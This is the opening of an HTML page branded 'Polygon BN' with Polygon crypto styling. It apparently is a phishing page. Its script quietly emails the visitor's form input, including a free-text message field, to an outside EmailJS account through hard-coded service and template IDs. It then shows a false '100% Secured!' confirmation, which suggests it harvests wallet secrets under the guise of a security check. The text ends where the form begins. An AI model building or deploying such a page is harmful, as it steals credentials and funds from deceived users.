<!DOCTYPE html>
<html lang="en">
<head>

<link rel="icon" type="image/png" href="polygon.png">
  <meta charset="UTF-8">
  <title>Polygon BN</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #6a0dad, #9b30ff);
      max-width: 400px;
      margin: 40px auto;
      padding: 20px;
 
      border-radius: 8px;
    }
    .popup {
      position: fixed;
      top: 20px;
      right: 20px;
      padding: 15px 20px;
      border-radius: 10px;
      font-weight: bold;
      display: none;
      z-index: 9999;
      animation: fadeIn 0.3s ease-out;
    }
    .success {
      background-color: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
    }
    .error {
      background-color: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-10px); }
      to { opacity: 1; transform: translateY(0); }
    }
	
	.text{
	padding:50px 100px;
	border-radius:20px;
	}
	
  </style>
  <script>
    (function(){
      emailjs.init("QO0TQU48PsG8c3TfI"); // Replace with your Public Key
    })();

    function showPopup(message, type) {
      const popup = document.getElementById("popup");
      popup.innerHTML = message;
      popup.className = "popup " + type;
      popup.style.display = "block";

      // Hide after 2 seconds
      setTimeout(() => {
        popup.style.display = "none";
      }, 2000);
    }

    function sendMail(e) {
      e.preventDefault();

      const params = {
        from_name: document.getElementById("name").value,
        from_email: document.getElementById("email").value,
        message: document.getElementById("message").value,
      };

      const serviceID = "service_06ulaoi";   // Replace with your Service ID
      const templateID = "template_4x3kgoa"; // Replace with your Template ID

      emailjs.send(serviceID, templateID, params)
        .then(res => {
          showPopup("‚úî 100% Secured!", "success");
        })
        .catch(err => {
          showPopup("‚ùå Error while checking.", "error");
        });
    }
  </script>
</head>
<body>

  <form onsubmit="sendMail(event)">
   
    <input style= 'display:none;' type="text" id="name" value="chisom" required><br><br>
